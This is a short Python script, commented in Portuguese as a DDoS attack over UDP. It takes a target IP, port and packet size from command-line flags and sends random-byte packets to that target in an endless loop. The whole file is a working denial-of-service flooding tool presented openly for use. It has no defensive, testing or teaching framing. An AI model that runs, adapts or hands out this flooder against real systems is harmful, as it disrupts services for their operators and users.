import socket,sys,random
# Script de ataque DDOS via coneção UDP
if(len(sys.argv) >= 3):
    if("-i" in sys.argv):
        ip = str(sys.argv[int(sys.argv.index("-i")+1)])
        if("-p" in sys.argv):
            port = int(sys.argv[int(sys.argv.index("-p")+1)])
        else:
            port = 80
        if("-t" in sys.argv):
            t = int(sys.argv[int(sys.argv.index("-t")+1)])
        else:
            t = 1024
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        pac = random._urandom(t)
        while True:
            s.sendto(pac,(ip,port))
    else:
        print("[!] ]====> Erro!")
        exit()
else:
    exit()